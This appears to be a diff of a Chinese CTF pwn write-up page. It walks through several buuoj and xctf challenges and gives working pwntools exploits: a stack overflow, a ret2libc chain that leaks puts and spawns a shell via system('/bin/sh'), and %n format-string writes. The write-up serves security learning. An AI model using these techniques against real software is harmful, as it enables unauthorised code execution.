-<figcaption aria-hidden="true">屏幕截图 2022-03-27 162817</figcaption>
-</figure>
-<figure>
-<img src="E:\屏幕截图\屏幕截图%202022-03-27%20162832.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-27 162832" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-27 162832</figcaption>
-</figure>
-<h1 id="jarvisoj_level0-buuoj-pwn">jarvisoj_level0 buuoj pwn</h1>
+<p>![屏幕截图 2022-03-27 162817](E:\屏幕截图\屏幕截图 2022-03-27 162817.png)</p>
+<p>![屏幕截图 2022-03-27 162832](E:\屏幕截图\屏幕截图 2022-03-27 162832.png)</p>
+<h1>jarvisoj_level0 buuoj pwn</h1>
 <p>基础的栈溢出问题，打开关键函数发现，可以写入的量超过了栈，于是可以覆盖返回地址</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/xYinmkDd4MwXVPb.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-28 135327" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-28 135327</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/24RceGXmS7b8dys.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-28 135343" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-28 135343</figcaption>
-</figure>
-<h1 id="xctf-int-overflow">xctf int overflow</h1>
+<p><img src="https://s2.loli.net/2022/04/08/xYinmkDd4MwXVPb.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-28 135327"></p>
+<p><img src="https://s2.loli.net/2022/04/08/24RceGXmS7b8dys.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-28 135343"></p>
+<h1>xctf int overflow</h1>
 <p>这题看题目就知道可以利用int的溢出，当数据超过int型的最大范围时，就会溢出变为负数的最大值</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/3caQN7M6dX4Fk2A.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 130558" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 130558</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/HJZBaVd5sx97CyX.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 130548" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 130548</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/dfZuW9NerCSDO3L.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 130539" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 130539</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/odzHA1EOWvgXUrF.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 130858" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 130858</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/04/08/3caQN7M6dX4Fk2A.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 130558"></p>
+<p><img src="https://s2.loli.net/2022/04/08/HJZBaVd5sx97CyX.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 130548"></p>
+<p><img src="https://s2.loli.net/2022/04/08/dfZuW9NerCSDO3L.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 130539"></p>
+<p><img src="https://s2.loli.net/2022/04/08/odzHA1EOWvgXUrF.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 130858"></p>
 <p>于是我们只要将buf的长度更改为258-266之间，并且在buf的前面把dest的栈溢出即可</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-number">54577</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please input your username:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;123&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please input your passwd:&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p32(<span class="hljs-number">0x08048694</span>)<br>a.sendline(payload.ljust(<span class="hljs-number">260</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>a.interactive()<br></code></pre></td></tr></table></figure>
-<h1 id="buuoj-ciscn_2019_c_1">buuoj ciscn_2019_c_1</h1>
+<h1>buuoj ciscn_2019_c_1</h1>
 <p>checksec后发现是标准的ret2libc题目，但是这个程序是64位的，在构造payload获得puts的地址方式有差别</p>
 <p>64位：覆盖栈+.got+.plt+main的地址</p>
 <p>32位：覆盖栈+.plt+main的地址+.got</p>
 <p>然后此题的环境还是ubuntu18，Ubuntu18以上后在构造栈溢出后需要堆栈平衡，就必须引入pop_rdi_ret</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/i9RMjdFw1O7Uyeh.png" srcset="/img/loading.gif" lazyload alt="1" />
-<figcaption aria-hidden="true">1</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/m2YQHTCEdygw5bi.png" srcset="/img/loading.gif" lazyload alt="2" />
-<figcaption aria-hidden="true">2</figcaption>
-</figure>
-<p>于是就可以写payload了，但是我的exp卡在了puts_addr=u64(a.recv(7)[:-1].ljust(8,b''))这里，看了别人的exp才知道在这前面还要再吃个回车，我也不知道为啥，是因为puts(s)?</p>
+<p><img src="https://s2.loli.net/2022/04/08/i9RMjdFw1O7Uyeh.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="https://s2.loli.net/2022/04/08/m2YQHTCEdygw5bi.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>于是就可以写payload了，但是我的exp卡在了puts_addr=u64(a.recv(7)[:-1].ljust(8,b’\x00’))这里，看了别人的exp才知道在这前面还要再吃个回车，我也不知道为啥，是因为puts(s)?</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26328</span>)<br>elf=ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>main_addr=<span class="hljs-number">0x00400B28</span><br>pop_rdi_ret=<span class="hljs-number">0x400c83</span><br>a.recvuntil(<span class="hljs-string">&quot;Input your choice!&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x08</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<span class="hljs-comment">#unbuntu有堆栈平衡，需要加pop_rdi_ret，之前一直payload构造不上去</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Ciphertext\n&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#卡在这里了wwww,最后这里还是看了wp</span><br>puts_addr=u64(a.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libcbase+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your choice!&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x08</span>+p64(<span class="hljs-number">0x00400C1C</span>)+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)<br>a.sendline(payload2)<br>a.interactive()<br></code></pre></td></tr></table></figure>
-<h1 id="xctf-pwn-cgfsb">xctf pwn cgfsb</h1>
+<h1>xctf pwn cgfsb</h1>
 <p>本题利用的是格式化字符串的漏洞来进行解题</p>
 <p>相关知识：</p>
 <blockquote>
-<p><a
-target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1
-格式化字符串漏洞 · CTF All In One (gitbooks.io)</a></p>
-<p><a
-target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_9">Format
-String - CTF Wiki (ctf-wiki.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1 格式化字符串漏洞 · CTF All In One (gitbooks.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_9">Format String - CTF Wiki (ctf-wiki.org)</a></p>
 <p><strong>要点</strong>：</p>
-<ol type="1">
-<li><p>根据 cdecl 的调用约定，在进入 <code>printf()</code>
-函数之前，将参数从右到左依次压栈。进入 <code>printf()</code>
-之后，函数首先获取第一个参数，一次读取一个字符。如果字符不是
-<code>%</code>，字符直接复制到输出中。否则，读取下一个非空字符，获取相应的参数并解析输出。（注意：<code>% d</code>
-和 <code>%d</code> 是一样的）</p></li>
-<li><p>在进入 printf
-之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p></li>
+<ol>
+<li>
+<p>根据 cdecl 的调用约定，在进入 <code>printf()</code> 函数之前，将参数从右到左依次压栈。进入 <code>printf()</code> 之后，函数首先获取第一个参数，一次读取一个字符。如果字符不是 <code>%</code>，字符直接复制到输出中。否则，读取下一个非空字符，获取相应的参数并解析输出。（注意：<code>% d</code> 和 <code>%d</code> 是一样的）</p>
+</li>
+<li>
+<p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
+</li>
 </ol>
 <ul>
 <li>当前字符不是 %，直接输出到相应标准输出。</li>
@@ -624,118 +455,77 @@ String - CTF Wiki (ctf-wiki.org)</a></p>
 <li>如果没有字符，报错</li>
 <li>如果下一个字符是 %, 输出 %</li>
 <li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
-</ul></li>
+</ul>
+</li>
 </ul>
 <p>那么假设，此时我们在编写程序时候，写成了下面的样子</p>
-<p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&gt;<span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure></p>
+ <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&gt;<span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure>
 <p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p>
-<ol type="1">
-<li><p>解析其地址对应的字符串</p></li>
-<li><p>解析其内容对应的整形值</p></li>
-<li><p>解析其内容对应的浮点值</p></li>
-<li><p>```c //源码 #include&lt;stdio.h&gt; void main() { char
-format[128]; int arg1 = 1, arg2 = 0x88888888, arg3 = -1; char arg4[10] =
-"ABCD"; scanf("%s", format); printf(format, arg1, arg2, arg3, arg4);
-printf(""); } <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">[------------------------------------stack-------------------------------------]<br>0000| 0xffffd550 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)<br>0004| 0xffffd554 --&gt; 0x1<br>0008| 0xffffd558 --&gt; 0x88888888<br>0012| 0xffffd55c --&gt; 0xffffffff<br>0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)<br>0020| 0xffffd564 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)<br>0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)<br>0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x56555642 in main ()<br></code></pre></td></tr></table></figure></p></li>
+<ol>
+<li>
+<p>解析其地址对应的字符串</p>
+</li>
+<li>
+<p>解析其内容对应的整形值</p>
+</li>
+<li>
+<p>解析其内容对应的浮点值</p>
+</li>
+<li>
+<pre><code class="language-c"> //源码
+ #include&lt;stdio.h&gt;
+ void main() &#123;
+ char format[128];
+ int arg1 = 1, arg2 = 0x88888888, arg3 = -1;
+ char arg4[10] = &quot;ABCD&quot;;
+ scanf(&quot;%s&quot;, format);
+ printf(format, arg1, arg2, arg3, arg4);
+ printf(&quot;\n&quot;);
+ &#125;
+</code></pre>
+</li>
 </ol>
-<p>格式字符串的地址在
-<code>0xffffd584</code>，从下面的输出中可以看到它们在栈中是怎样排布的：</p>
-<p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;gdb-peda$ x/20w $esp<br>&gt;0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff<br>&gt;0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7<br>&gt;0xffffd570:     0xf7ffda54      0x00000001      0x424135d0      0x00004443<br>&gt;0xffffd580:     0x00000000      0x41414141      0x2e70252e      0x252e7025<br>&gt;0xffffd590:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70<br>&gt;gdb-peda$ x/20wb 0xffffd584<br>&gt;0xffffd584:     0x41    0x41    0x41    0x41    0x2e    0x25    0x70    0x2e<br>&gt;0xffffd58c:     0x25    0x70    0x2e    0x25    0x70    0x2e    0x25    0x70<br>&gt;0xffffd594:     0x2e    0x25    0x70    0x2e<br>&gt;gdb-peda$ python print(&#x27;\x2e\x25\x70&#x27;)<br>&gt;.%p<br></code></pre></td></tr></table></figure></p>
+  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+ <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">[------------------------------------stack-------------------------------------]<br>0000| 0xffffd550 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)<br>0004| 0xffffd554 --&gt; 0x1<br>0008| 0xffffd558 --&gt; 0x88888888<br>0012| 0xffffd55c --&gt; 0xffffffff<br>0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)<br>0020| 0xffffd564 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)<br>0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)<br>0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x56555642 in main ()<br></code></pre></td></tr></table></figure>
+<p>格式字符串的地址在 <code>0xffffd584</code>，从下面的输出中可以看到它们在栈中是怎样排布的：</p>
+ <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;gdb-peda$ x/20w $esp<br>&gt;0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff<br>&gt;0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7<br>&gt;0xffffd570:     0xf7ffda54      0x00000001      0x424135d0      0x00004443<br>&gt;0xffffd580:     0x00000000      0x41414141      0x2e70252e      0x252e7025<br>&gt;0xffffd590:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70<br>&gt;gdb-peda$ x/20wb 0xffffd584<br>&gt;0xffffd584:     0x41    0x41    0x41    0x41    0x2e    0x25    0x70    0x2e<br>&gt;0xffffd58c:     0x25    0x70    0x2e    0x25    0x70    0x2e    0x25    0x70<br>&gt;0xffffd594:     0x2e    0x25    0x70    0x2e<br>&gt;gdb-peda$ python print(&#x27;\x2e\x25\x70&#x27;)<br>&gt;.%p<br></code></pre></td></tr></table></figure>
 <p>下面是程序运行的结果：</p>
-<p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;gdb-peda$ c<br>&gt;Continuing.<br>&gt;AAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e<br></code></pre></td></tr></table></figure></p>
-<p><code>0x41414141</code> 是输出的第 13 个字符，所以我们使用
-<code>%13$s</code> 即可读出 <code>0x41414141</code>
-处的内容，当然，这里可能是一个不合法的地址。只要将0x41414141改成有效地址就可以任意地址的访问</p>
-<ol start="4" type="1">
+ <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;gdb-peda$ c<br>&gt;Continuing.<br>&gt;AAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e<br></code></pre></td></tr></table></figure>
+<p><code>0x41414141</code> 是输出的第 13 个字符，所以我们使用 <code>%13$s</code> 即可读出 <code>0x41414141</code> 处的内容，当然，这里可能是一个不合法的地址。只要将0x41414141改成有效地址就可以任意地址的访问</p>
+<ol start="4">
 <li>%$n可以将当前已经写入的字符个数赋值给所给的地址</li>
 </ol>
 </blockquote>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/rOqGw3Eit6759Nn.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-30 170255" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-30 170255</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/04/08/rOqGw3Eit6759Nn.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-30 170255"></p>
 <p>根据前面对于格式化字符串漏洞的学习，我们可以找到pwn的地址，对其进行覆盖，pwnme位于bss区域，地址不会更改，所以我们只要找到printf的偏移量就可以写exp了</p>
-<figure>
-<img src="E:\屏幕截图\屏幕截图%202022-03-30%20170311.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-30 170311" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-30 170311</figcaption>
-</figure>
+<p>![屏幕截图 2022-03-30 170311](E:\屏幕截图\屏幕截图 2022-03-30 170311.png)</p>
 <p>可以知道偏移量为10</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-number">55080</span>)<br>a.sendlineafter(<span class="hljs-string">&quot;please tell me your name:&quot;</span>,<span class="hljs-number">123</span>)<br>payload=p32(<span class="hljs-number">0x0804A068</span>)+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+<span class="hljs-string">b&#x27;%10$n&#x27;</span><br>a.recvuntil(<span class="hljs-string">&quot;leave your message please:&quot;</span>)<br>a.sendline(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure>
-<h1 id="xctf-pwn-hello_pwn">xctf pwn hello_pwn</h1>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/zdgE82cBWfQeMku.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-30 171747" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-30 171747</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/A7Tz5ZsiQI1bqRH.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-30 171810" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-30 171810</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/T5uvUNApWwHFISn.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-30 171818" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-30 171818</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/03/30/Msaxd9lwcbtTqBm.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-30 171848" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-30 171848</figcaption>
-</figure>
-<h1 id="buuoj-pwn-pwn5">buuoj pwn pwn5</h1>
+<h1>xctf pwn hello_pwn</h1>
+<p><img src="https://s2.loli.net/2022/04/08/zdgE82cBWfQeMku.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-30 171747"></p>
+<p><img src="https://s2.loli.net/2022/04/08/A7Tz5ZsiQI1bqRH.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-30 171810"></p>
+<p><img src="https://s2.loli.net/2022/04/08/T5uvUNApWwHFISn.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-30 171818"></p>
+<p><img src="https://s2.loli.net/2022/03/30/Msaxd9lwcbtTqBm.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-30 171848"></p>
+<h1>buuoj pwn pwn5</h1>
 <p>首先先checksec一下程序，发现不可栈溢出和NX。打开ida分析下</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/02/WpaekqIwEZV52z3.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 154600" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 154600</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/02/XEz6VNvgWYpACwK.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 154619" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 154619</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/04/02/WpaekqIwEZV52z3.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 154600"></p>
+<p><img src="https://s2.loli.net/2022/04/02/XEz6VNvgWYpACwK.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 154619"></p>
 <p>同时判断的关键数据的地址正好位于bss段，地址不会更改。于是可以利用格式化输出的漏洞</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/02/uEwVZXh6FgD4PSf.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 154744" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 154744</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/04/02/uEwVZXh6FgD4PSf.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 154744"></p>
 <p>发现偏移量位10，于是可以写exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28470</span>)<br>a.recvuntil(<span class="hljs-string">&quot;your name:&quot;</span>)<br>payload=p32(<span class="hljs-number">0x0804C044</span>)+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+<span class="hljs-string">b&#x27;%10$n&#x27;</span><br>a.sendline(payload)<br>a.recvuntil(<span class="hljs-string">&quot;your passwd:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;8&#x27;</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure>
-<h1 id="buuoj-pwn-ciscn_2019_n_8">buuoj pwn ciscn_2019_n_8</h1>
-<p>scanf("%s")既提供了首地址，然后又没有限制输入的长度，可以利用这个来进行栈覆盖</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/03/CSmyes4dUzc1i8k.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-03 144825" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-03 144825</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/03/ZzBFN1hXi84IKRC.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-03 144740" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-03 144740</figcaption>
-</figure>
-<h1 id="buuoj-pwn-babyrop">buuoj pwn babyrop</h1>
+<h1>buuoj pwn ciscn_2019_n_8</h1>
+<p>scanf(“%s”)既提供了首地址，然后又没有限制输入的长度，可以利用这个来进行栈覆盖</p>
+<p><img src="https://s2.loli.net/2022/04/03/CSmyes4dUzc1i8k.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-03 144825"></p>
+<p><img src="https://s2.loli.net/2022/04/03/ZzBFN1hXi84IKRC.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-03 144740"></p>
+<h1>buuoj pwn babyrop</h1>
 <p>首先打开ida分析下程序运行方式</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/03/HZDy21KIEf986LF.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-03 160816" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-03 160816</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/03/sp7W5MItrBYvwEj.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-03 160827" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-03 160827</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/03/BxicPIzN45TlebU.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-03 160837" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-03 160837</figcaption>
-</figure>
